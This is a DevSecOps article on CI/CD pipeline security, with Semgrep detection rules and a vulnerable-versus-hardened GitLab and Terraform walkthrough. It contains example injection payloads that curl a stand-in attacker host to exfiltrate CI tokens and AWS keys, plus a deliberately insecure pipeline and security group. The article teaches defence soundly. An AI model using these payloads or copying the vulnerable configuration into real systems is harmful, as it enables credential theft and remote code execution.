# CI/CD Pipelines: What They Are, Why They Matter, and How to Secure Them

*Gurudeep Mallam · July 2026 · DevSecOps*

---

## Table of Contents

1. [The problem that CI/CD exists to solve](#1-the-problem-that-cicd-exists-to-solve)
2. [How a pipeline is structured](#2-how-a-pipeline-is-structured)
3. [Why pipelines are a security target](#3-why-pipelines-are-a-security-target)
4. [Common issues found in real pipelines](#4-common-issues-found-in-real-pipelines)
5. [Semgrep: static analysis for CI/CD security](#5-semgrep-static-analysis-for-cicd-security)
6. [Custom rules for modern infrastructure](#6-custom-rules-for-modern-infrastructure)
7. [Making pipelines more robust](#7-making-pipelines-more-robust)
8. [Practical walkthrough: bad pipeline vs hardened pipeline](#8-practical-walkthrough-bad-pipeline-vs-hardened-pipeline)

---

## 1. The problem that CI/CD exists to solve

Imagine a team of ten developers all writing code for the same application. Each person works on their own copy of the codebase. When it's time to release, someone has to manually merge all those changes together, run the tests, build the application, and copy it to a server. This takes hours. It breaks constantly. The person who does it dreads release day. And if a bug makes it through, rolling back means doing the whole thing in reverse.

This was standard practice until about fifteen years ago. The manual process had a name that told you everything you needed to know: *integration hell*. The longer you waited between merges, the worse it got.

CI/CD — Continuous Integration and Continuous Delivery — was the answer. The core idea is straightforward: automate everything between a developer pushing code and that code running in production. Every push triggers a pipeline. The pipeline builds the application, runs the tests, checks for security issues, and — if everything passes — deploys it. No human steps. No release days. No integration hell.

| Without CI/CD | With CI/CD |
|---|---|
| Manual merge and build before each release | Every push triggers an automated build |
| Bugs discovered days or weeks after they were introduced | Tests run within minutes; bugs caught at the source |
| Releases happen rarely, under pressure | Deployment is routine — teams ship multiple times per day |
| Rollback requires manual intervention | Automated gates block a bad build before it reaches production |
| No consistent audit trail of what deployed when | Every deployment tied to a specific commit and pipeline run |

The two parts of the abbreviation are distinct. **CI (Continuous Integration)** is the practice of automatically building and testing code every time someone pushes a change. The goal is to catch integration problems early, when they're cheap to fix. **CD (Continuous Delivery or Continuous Deployment)** extends that automation to the delivery of working software to users, either by automating deployment entirely or by keeping the codebase always ready to deploy at the click of a button.

---

## 2. How a pipeline is structured

A CI/CD pipeline is a sequence of automated stages. Code enters the pipeline when a developer pushes a change. It moves through each stage in order. If any stage fails, the pipeline stops and the developer is notified. Only code that passes every stage reaches production.

```
┌────────┐     ┌────────┐     ┌────────┐     ┌────────┐     ┌────────┐     ┌────────┐
│  Lint  │ ──▶ │ Build  │ ──▶ │  Test  │ ──▶ │  Scan  │ ──▶ │  Gate  │ ──▶ │ Deploy │
└────────┘     └────────┘     └────────┘     └────────┘     └────────┘     └────────┘
Style, syntax  Compile or     Unit and       Security and   Block on       Ship to
and obvious    package the    integration    dependency     severity       staging or
mistakes       application    tests          checks         threshold      production
```

The pipeline runs on a **runner** — a machine (physical, virtual, or containerised) that executes the pipeline jobs. In GitLab CI/CD, you define the pipeline in a file called `.gitlab-ci.yml` that lives in your repository. The runner reads this file, executes each stage, and reports the results back.

Pipelines handle sensitive material constantly. They hold API keys and database passwords in **CI variables** (environment variables injected at runtime). They build and push container images. They run with permissions to deploy to production infrastructure. They connect to cloud accounts. This is why they are worth understanding from a security perspective — not just from an operations one.

### A basic pipeline definition

Below is a simplified example of what a GitLab CI pipeline configuration looks like. Each entry under `stages` is a phase; each job specifies which stage it belongs to and what commands to run.

```yaml
stages:
  - lint
  - build
  - test
  - scan
  - deploy

# Stage 1: check code style and syntax
lint-job:
  stage: lint
  script:
    - pip install flake8
    - flake8 src/

# Stage 4: run security scanner
semgrep-scan:
  stage: scan
  script:
    - semgrep --config=p/secrets --config=rules/ --error .
  only: [main, develop]

# Stage 5: deploy only if all prior stages passed
deploy-prod:
  stage: deploy
  script:
    - ./deploy.sh
  environment:
    name: production
  only: [main]
```

---

## 3. Why pipelines are a security target

If you want to understand why CI/CD pipelines attract attackers, follow the access. A pipeline runner typically has permission to read all the source code, pull and push container images, access production deployment credentials, and write to package registries. It often runs in the same network as production systems.

Compromise a developer's laptop and you get that developer's files. Compromise the CI/CD pipeline and you get everything the pipeline touches — which is often the entire application, the cloud account, and the release process. The **SolarWinds attack** in 2020 is the most widely known example of this: attackers injected malicious code into the build process of a software company's pipeline, which then shipped that code to 18,000 customers as a legitimate signed update.

The pipeline is also attractive because it is automated and trusted. Code that passes a pipeline is assumed to be safe. Subverting the pipeline means subverting that assumption without triggering any alerts — because the build succeeds, the tests pass, and the deployment happens exactly as designed.

### The supply chain dimension

Modern software doesn't just run code you wrote. It runs code from hundreds of packages, libraries, and base images authored by people you've never met. When any of those dependencies is compromised — whether through a hack, a typosquatted package name, or a malicious update — every application that depends on it inherits that compromise. This is called a **software supply chain attack**.

Pipelines are the mechanism through which supply chain attacks reach production. A compromised package gets installed during the build stage. A tampered base image gets pulled during the deployment stage. The pipeline didn't create the vulnerability, but it executed it — and nothing in the standard pipeline checked for it.

---

## 4. Common issues found in real pipelines

These are not theoretical. They appear in production pipelines across organisations of all sizes, including ones with dedicated security teams.

### Issue 1 — Shell injection via pipeline variables

GitLab CI `script:` blocks run in a shell. If a variable expanded inside a script — like `${CI_COMMIT_MESSAGE}` — comes from external input such as a commit message, pull request title, or API trigger, an attacker who controls that input can inject shell commands. The pipeline executes them with whatever permissions the runner has.

For example: a job that runs `echo "Deploying ${CI_COMMIT_MESSAGE}"` and the commit message is `; curl attacker.com/exfil?token=$CI_JOB_TOKEN`. The token leaves the network and the job still succeeds.

> **From a real engagement:** While reviewing a GitLab pipeline during a security assessment, I found `$CI_MERGE_REQUEST_TITLE` being expanded directly inside a `before_script` block that ran on all branches — including merge requests opened by external contributors. The variable content came entirely from the person opening the MR. The team had masked the variable (so it wouldn't appear in logs) but hadn't considered that masking has nothing to do with where the value originates. The remediation wasn't to sanitise the value inside the script — it was to remove the variable from the shell context entirely and pass it only where it was structurally needed.

### Issue 2 — Hardcoded secrets in CI configuration

Credentials appear in pipeline configuration in forms that aren't always obvious: embedded in inline scripts, concatenated into URLs, or written to log artifacts as part of debug output. They also appear in source files called from pipeline jobs — deploy scripts, database migration scripts, health check scripts. These are often checked into version control, making the secret persistent even after rotation.

### Issue 3 — Floating image tags and unpinned dependencies

`FROM python:3.11` in a Dockerfile resolves to whatever the registry serves under that tag at build time. Tags are mutable — a maintainer can push a different image under the same tag without changing your configuration. If the upstream image is compromised, every build that runs after that point pulls the compromised image.

Digest pinning is the fix: `FROM python:3.11@sha256:abc123...` locks to a specific image by its cryptographic hash. That hash cannot be reassigned; the image is immutable. The same principle applies to GitHub Actions (`uses: actions/checkout@v4` vs `uses: actions/checkout@abc123...`) and package dependencies.

> **Why this is easy to miss:** In practice, pipelines with floating tags pass every build for months or years — until they don't. The breakage when a tag moves isn't "the image is compromised"; it's usually "the build broke for no reason we can find." The security risk hides inside what looks like an ops problem. When I've reviewed pipelines for this, the most common finding is a pinned application image but a floating CI tooling image — the team pinned what they wrote but not what they pulled from upstream.

### Issue 4 — GitLab variable scope: masked but not protected

GitLab CI variables have two independent settings: **masked** (hidden from job logs) and **protected** (only available on protected branches and tags). These are not the same thing. A variable that is masked but not protected will be hidden in logs but is still accessible to any pipeline on any branch — including pipelines triggered by merge requests from forks. Most teams set masking and stop there. Unprotected secrets are reachable from any branch a contributor can create.

### Issue 5 — Cross-pipeline trust chains

GitLab's `needs:` keyword lets a job consume artifacts from another job — including jobs from downstream pipelines. `extends:` imports job templates that may live in a separate repository. Both create trust relationships that are invisible when auditing a single YAML file. A pipeline that looks clean in isolation may be inheriting configuration from a template repo with looser controls, or consuming artifacts from a downstream project with different access policies.

> [!IMPORTANT]
> **The common thread:** all of these issues exist because the pipeline has real power — production access, credentials, deployment authority — and that power is exercised automatically. Any input that isn't validated, any credential that isn't scoped, any dependency that isn't pinned becomes a lever an attacker can pull without triggering human review.

---

## 5. Semgrep: static analysis for CI/CD security

Static analysis means inspecting code without running it. Semgrep is a static analysis tool that works by matching patterns against the abstract syntax tree (AST) of source code — the structural representation of code after it's been parsed — rather than running a regex over raw text.

The difference matters. A regex looking for `password\s*=\s*"[^"]+"` will find a hardcoded password in a simple Python file. It will miss the same value if it's split across a multi-line string, embedded in a YAML block, or assembled from concatenation. Semgrep's AST-based matching understands the structure of the code, which makes patterns more reliable and less dependent on exact formatting.

### What the default rule packs cover

| Pack | What it catches |
|---|---|
| `p/secrets` | High-entropy strings, known credential formats (AWS keys, GitHub PATs, etc.) |
| `p/docker` | Dockerfile anti-patterns: `ADD` vs `COPY`, running as root, `curl \| sh` |
| `p/gitlab` | CI YAML deprecated feature usage |
| `p/terraform` | Open security groups, public S3 buckets, unencrypted resources |

These cover the obvious, well-documented patterns. What they don't cover are the gaps between languages: CI YAML as a code surface, Terraform provider version pinning, multi-stage Dockerfile ARG leakage, or the GitLab variable scope issue described above.

> **What actually happens when a scan stage blocks a build:** The first time I wired Semgrep into a real pipeline with `--error` (not `--warning`), it caught 18 legitimate findings on the first run — style violations, a `subprocess.run(shell=True)` in a utility script, and a hardcoded string that matched the secrets pattern. The immediate instinct is to add them all to `.semgrepignore` and move on. The right call is to triage: the subprocess finding was real and got fixed; the secrets pattern was a false positive on a test fixture and got a targeted suppression comment with a note explaining why. That triage process is where the value of static analysis actually lands — not the scan itself, but what you do with the results.

### How Semgrep rules are written

Each rule is a YAML file with a pattern, a message, a severity, and an optional set of paths to include or exclude. The pattern is written in pseudocode that looks like the language being analysed. Semgrep fills in the gaps — `$VAR` is a wildcard that matches any variable name; `...` matches any number of statements.

```yaml
# A rule that matches any call to subprocess.run
# where shell=True is set — a command injection risk
rules:
  - id: subprocess-shell-true
    pattern: subprocess.run(..., shell=True)
    message: >
      subprocess.run with shell=True passes the command to a shell,
      enabling injection if any input is attacker-controlled.
    languages: [python]
    severity: ERROR
```

---

## 6. Custom rules for modern infrastructure

The default Semgrep packs were written for traditional application code. Modern infrastructure — containerised builds, Terraform-managed cloud resources, GitLab pipelines with external tool integrations — has patterns the defaults don't reach. The following are custom rules written to address those gaps.

---

### Rule 1 · Dockerfile — Unpinned base image

Any `FROM` instruction that specifies a tag but not a digest is pinned in name only. Tags can be overwritten by anyone with push access to that registry. This rule flags every `FROM` that lacks a `@sha256:...` component, while allowing `FROM scratch` explicitly since it has no upstream surface.

```yaml
rules:
  - id: dockerfile-unpinned-base-image
    pattern: |
      FROM $IMAGE
    pattern-not: |
      FROM $IMAGE@sha256:$DIGEST
    pattern-not-regex: 'FROM scratch'
    message: >
      Base image $IMAGE uses a mutable tag. Pin with
      @sha256:... to make builds reproducible.
    languages: [dockerfile]
    severity: WARNING
```

---

### Rule 2 · GitLab CI YAML — Attacker-controlled variable in script block

GitLab exposes several variables whose values come from external input: commit messages, merge request titles and descriptions, branch names set by fork contributors. When these appear inside a `script:` block, they're passed to a shell. The rule is path-scoped to CI YAML files to keep the false positive rate low.

```yaml
rules:
  - id: gitlab-ci-attacker-var-in-script
    pattern-regex: |
      \$\{?(CI_COMMIT_MESSAGE|
            CI_MERGE_REQUEST_TITLE|
            CI_MERGE_REQUEST_DESCRIPTION|
            CI_COMMIT_REF_NAME)\}?
    message: >
      This variable's value comes from external input.
      Using it in a script block risks shell injection.
      Sanitise or avoid direct expansion.
    languages: [yaml]
    severity: ERROR
    paths:
      include:
        - "*.gitlab-ci.yml"
        - ".gitlab-ci.yml"
```

---

### Rule 3 · Terraform HCL — Provider without version constraint

A `required_providers` block without a `version` key will pull the latest provider version on every `terraform init`. A provider update that changes resource behaviour or introduces a breaking change then lands silently — no code changed, but the infrastructure did. This is a supply chain risk at the IaC layer.

```yaml
rules:
  - id: terraform-provider-no-version
    patterns:
      - pattern: |
          terraform {
            required_providers {
              $PROVIDER = { source = $SOURCE }
            }
          }
      - pattern-not: |
          terraform {
            required_providers {
              $PROVIDER = { ..., version = $V }
            }
          }
    message: >
      Provider $PROVIDER has no version constraint.
      Use version = "~> x.y" to prevent silent upgrades.
    languages: [hcl]
    severity: WARNING
```

---

### Rule 4 · Python / Bash — Hardcoded credential in deployment scripts

The secrets pack catches credentials in application source files. It typically misses credentials in the deployment and operations scripts called from pipeline jobs, because those files don't look like application code. Scoping this rule to `deploy_*.py` and `scripts/` keeps noise low while covering the paths most likely to contain real credentials.

```yaml
rules:
  - id: ci-script-hardcoded-credential
    pattern-either:
      - pattern: $TOKEN = "..."
      - pattern: $PASSWORD = "..."
      - pattern: $SECRET = "..."
    pattern-not-regex: '(test|mock|fake|example|placeholder)'
    message: >
      Possible hardcoded credential. Use environment
      variables or a secrets manager.
    languages: [python, bash]
    severity: ERROR
    paths:
      include: ["deploy_*.py", "scripts/"]
```

---

### Writing better rules: what actually matters

**False positives kill adoption.** A rule that fires constantly on test fixtures, mock configs, and legitimate placeholder values gets disabled. Adding `pattern-not-regex` with a list of obvious non-credential terms (test, mock, fake, example) drops noise without affecting real findings.

**Path scoping is underused.** Scoping a YAML rule to `.gitlab-ci.yml` specifically means it only fires on CI configuration — not on every YAML file in the repository. This is the difference between a useful rule and an unusable one.

**Severity should match pipeline impact.** A `WARNING` that doesn't block the pipeline accumulates and gets ignored — warning fatigue is a real operational problem. An `ERROR` that blocks it gets fixed. Changing severity from WARNING to ERROR on tuned rules, after the false positive rate is understood, is where the security value actually lands.

---

## 7. Making pipelines more robust

### Block, don't warn

The single highest-leverage change is converting the scan stage from advisory to blocking. If a security finding doesn't stop the pipeline, it gets acknowledged and forgotten. The moment a CRITICAL or HIGH finding exits the pipeline with a non-zero code and blocks deployment, it becomes someone's problem to fix before the next release. This requires tuning rules first — a blocking stage that fires on false positives will be bypassed.

### Scheduled scans, not just push-triggered scans

A pipeline that only scans on push will miss drift. A base image that passed a scan two weeks ago may have had its tag reassigned. A Terraform provider that was pinned may have drifted if the lockfile was regenerated without the version constraint. Running the same scan stage on a scheduled cron job against the current default branch catches these without requiring a code change to trigger them.

### Least privilege for CI service accounts

Pipelines accumulate permissions. A service account starts with what it needs to run a deployment, and over time gains access to logs, monitoring, secrets management, and whatever else the team found it convenient to reuse. The right model is scoped, short-lived credentials — ideally OIDC tokens exchanged at job runtime, valid only for the duration of that job, with only the permissions that specific job requires. This limits what an attacker gains if they compromise a pipeline job.

### Gaps that tooling doesn't yet solve cleanly

Static analysis audits one file at a time. The cross-pipeline trust chain issue — where a pipeline inherits configuration from a remote template or consumes artifacts from a downstream project — requires either tooling that understands the full GitLab project graph or a documented manual review process for any job that uses `needs:` or `extends:` across project boundaries. Neither fits cleanly into a Semgrep rule. Organisational policy and access control reviews are the current best answer.

Similarly, container-native build tools like Kaniko and BuildKit introduce patterns that default Dockerfile rules don't model: Kaniko's context directory exposure if `.dockerignore` is incomplete, BuildKit's persistent cache mounts that can carry secrets across builds. These are specific to modern build infrastructure and require rules written for those specific tools.

> [!IMPORTANT]
> **The core principle:** pipelines should fail closed. A finding that doesn't stop a deployment has no enforcement value. A dependency that isn't pinned isn't trusted. A variable that isn't scoped to the branch it's needed on is available everywhere. The posture is: explicit allowance, not implicit trust.

---

---

## 8. Practical walkthrough: bad pipeline vs hardened pipeline

This section walks through a realistic infrastructure deployment — a web application sitting behind a load balancer, a WAF, and a firewall — and shows what the CI/CD pipeline looks like when it's misconfigured versus when it's hardened. The infrastructure is the same in both cases; only the pipeline and the Terraform configuration change.

### The infrastructure

```
Internet
    │
    ▼
┌─────────────┐
│  Firewall   │  (only 443/80 in, blocks all else)
└──────┬──────┘
       │
    ▼
┌─────────────┐
│     WAF     │  (OWASP ruleset, rate limiting)
└──────┬──────┘
       │
    ▼
┌─────────────┐
│ Load Balancer│  (NGINX / HAProxy, round-robin)
└──────┬──────┘
       │
   ┌───┴───┐
   ▼       ▼
┌──────┐ ┌──────┐
│ App1 │ │ App2 │  (Python/Node application servers)
└──────┘ └──────┘
       │
    ▼
┌─────────────┐
│  Database   │  (Postgres, private subnet, no public access)
└─────────────┘
```

The pipeline deploys changes to this stack: app code to the app servers, and infrastructure changes (firewall rules, load balancer config, WAF policies) via Terraform.

---

### Bad configuration

#### `.gitlab-ci.yml` — vulnerable

```yaml
stages:
  - build
  - deploy

variables:
  DB_PASSWORD: "Passw0rd123!"          # hardcoded in plain text
  AWS_SECRET_KEY: "wJalrXUtnFEMI/K7..."  # hardcoded AWS credential
  DEPLOY_ENV: production

build-job:
  stage: build
  image: python:3.11                   # floating tag — not pinned to digest
  script:
    - pip install -r requirements.txt
    - python build.py

deploy-job:
  stage: deploy
  image: hashicorp/terraform:latest    # "latest" — resolves to whatever's current
  script:
    # attacker-controlled variable passed directly to shell
    - echo "Deploying branch $CI_COMMIT_REF_NAME to $DEPLOY_ENV"
    - export TF_VAR_db_password=$DB_PASSWORD
    - terraform init
    - terraform apply -auto-approve    # no plan review, applies immediately
    - ssh root@10.0.1.10 "cd /app && git pull && restart.sh $CI_COMMIT_MESSAGE"
```

**What's wrong:**

| Problem | Location | Risk |
|---|---|---|
| Hardcoded `DB_PASSWORD` in `variables:` block | Line 4 | Anyone with repo read access sees this; it persists in git history even after removal |
| Hardcoded `AWS_SECRET_KEY` | Line 5 | Full AWS access exposed; this credential can create resources, exfil data, pivot to other accounts |
| `python:3.11` without digest | Line 13 | If the tag is reassigned to a compromised image, next build pulls it silently |
| `hashicorp/terraform:latest` | Line 20 | `latest` is the most dangerous tag — changes on every release without warning |
| `$CI_COMMIT_REF_NAME` in shell command | Line 23 | Branch names are attacker-controlled. A branch named `; curl attacker.com/steal?k=$AWS_SECRET_KEY` executes that curl |
| `$CI_COMMIT_MESSAGE` passed to SSH command | Line 27 | Commit messages are attacker-controlled. This is remote code execution on the app server |
| `terraform apply -auto-approve` | Line 26 | Infrastructure changes deploy with no human review. A misconfigured WAF rule or firewall opening goes straight to production |
| SSH as `root` | Line 27 | Any code execution in this step runs as root on the production server |

#### `terraform/firewall.tf` — vulnerable

```hcl
terraform {
  required_providers {
    aws = {
      source = "hashicorp/aws"
      # no version constraint — pulls latest on every init
    }
  }
}

resource "aws_security_group" "app_sg" {
  name = "app-security-group"

  # WAF bypass: allows direct access to app servers, skipping WAF entirely
  ingress {
    from_port   = 8080
    to_port     = 8080
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]    # open to the entire internet
  }

  # Database reachable from any app server AND the internet
  ingress {
    from_port   = 5432
    to_port     = 5432
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]    # database exposed publicly
  }

  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }
}
```

**What's wrong:** The WAF is bypassed entirely — port 8080 is open directly to the internet. The database is reachable from anywhere. A Semgrep scan with `p/terraform` would catch the `0.0.0.0/0` on port 5432 (database), but not necessarily the WAF bypass on 8080.

---

### Good configuration

#### `.gitlab-ci.yml` — hardened

```yaml
stages:
  - build
  - scan
  - plan
  - deploy

# No secrets in variables block.
# DB_PASSWORD and AWS credentials come from GitLab CI/CD settings,
# marked both masked AND protected.

build-job:
  stage: build
  # Pinned to digest — this exact image, not whatever :3.11 resolves to today
  image: python:3.11@sha256:8a9b2c4d1e6f3a7b9c0d2e4f6a8b0c2d4e6f8a0b2c4d6e8f0a2b4c6d8e0f2a4b
  script:
    - pip install -r requirements.txt
    - python build.py
  artifacts:
    paths: [dist/]
    expire_in: 1 hour

semgrep-scan:
  stage: scan
  image: returntocorp/semgrep@sha256:1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b
  script:
    # --error exits non-zero on any finding — this BLOCKS the pipeline
    - semgrep --config=p/secrets --config=p/terraform --config=rules/ --error .
  only: [main, develop]

terraform-plan:
  stage: plan
  image: hashicorp/terraform:1.8.4@sha256:3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d
  script:
    # OIDC token — short-lived, scoped only to this job's required permissions
    - export AWS_ROLE_ARN=$TF_DEPLOY_ROLE
    - aws sts assume-role-with-web-identity ...
    - terraform init
    # plan only — produces a saved plan file, does not apply anything
    - terraform plan -out=tfplan
  artifacts:
    paths: [tfplan]
  only: [main]

deploy-job:
  stage: deploy
  image: hashicorp/terraform:1.8.4@sha256:3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d
  script:
    # applies only the saved plan — no surprises, no auto-approve on live input
    - terraform apply tfplan
    # deploy script is fixed — no variable expansion, no commit message in shell
    - ./scripts/deploy.sh
  environment:
    name: production
  when: manual          # requires a human click after the plan is reviewed
  only: [main]
  needs: [semgrep-scan, terraform-plan]
```

#### `terraform/firewall.tf` — hardened

```hcl
terraform {
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.40"    # pinned to minor version range — no silent major upgrades
    }
  }
}

# Only the load balancer subnet can reach app servers on 8080
# Direct internet access to 8080 is blocked — all traffic must go through WAF → LB
resource "aws_security_group" "app_sg" {
  name = "app-security-group"

  ingress {
    from_port       = 8080
    to_port         = 8080
    protocol        = "tcp"
    security_groups = [aws_security_group.lb_sg.id]  # load balancer only, not 0.0.0.0/0
  }

  egress {
    from_port   = 443
    to_port     = 443
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]    # outbound HTTPS only
  }
}

# Database only reachable from app servers — never from the internet
resource "aws_security_group" "db_sg" {
  name = "db-security-group"

  ingress {
    from_port       = 5432
    to_port         = 5432
    protocol        = "tcp"
    security_groups = [aws_security_group.app_sg.id]  # app tier only
  }

  # no egress — database initiates no outbound connections
}

# WAF attached to load balancer — all traffic inspected before reaching app servers
resource "aws_wafv2_web_acl_association" "lb_waf" {
  resource_arn = aws_lb.main.arn
  web_acl_arn  = aws_wafv2_web_acl.owasp.arn
}
```

---

### What changed and why it matters

| Area | Bad | Good | Impact |
|---|---|---|---|
| Secrets | Hardcoded in YAML | GitLab masked + protected variables | Rotation without code changes; no git history exposure |
| Image pinning | Floating tags (`python:3.11`, `latest`) | Digest-locked (`@sha256:...`) | Immune to tag reassignment attacks |
| Scan stage | None | Semgrep with `--error` blocking on findings | Bad config never reaches plan or deploy |
| Terraform apply | `auto-approve` on live input | Saved plan + `when: manual` gate | Human reviews the diff before anything changes in production |
| Shell injection | `$CI_COMMIT_MESSAGE` in SSH command | Fixed deploy script, no variable expansion | Attacker-controlled input never reaches a shell |
| Network access | App port 8080 open to `0.0.0.0/0` | Load balancer security group only | WAF cannot be bypassed; direct access blocked at network layer |
| Database exposure | Port 5432 open to `0.0.0.0/0` | App security group only | Database unreachable from the internet regardless of app vulnerability |
| Provider pinning | No version constraint | `~> 5.40` | Terraform init is reproducible; no silent provider upgrades |

The security model is: **the pipeline is the last automated decision-maker before production**. Everything it deploys is trusted. If you trust the pipeline output, you have to trust everything that feeds into it — the images it pulls, the variables it expands, the scripts it runs, and the plans it applies. Hardening any one of these without the others leaves the others as viable attack paths.

---

## References

- [Semgrep Registry](https://semgrep.dev/r) — community and official rule packs, searchable by language and category
- [SLSA Framework](https://slsa.dev) — supply chain levels for software artifacts; the reference model for build provenance and integrity
- [GitLab CI/CD Security Best Practices](https://docs.gitlab.com/ee/ci/pipelines/pipeline_security.html) — official documentation on protected variables, masked secrets, and runner isolation

---

*Gurudeep Mallam · gurudeep.mallam@gmail.com · July 2026*
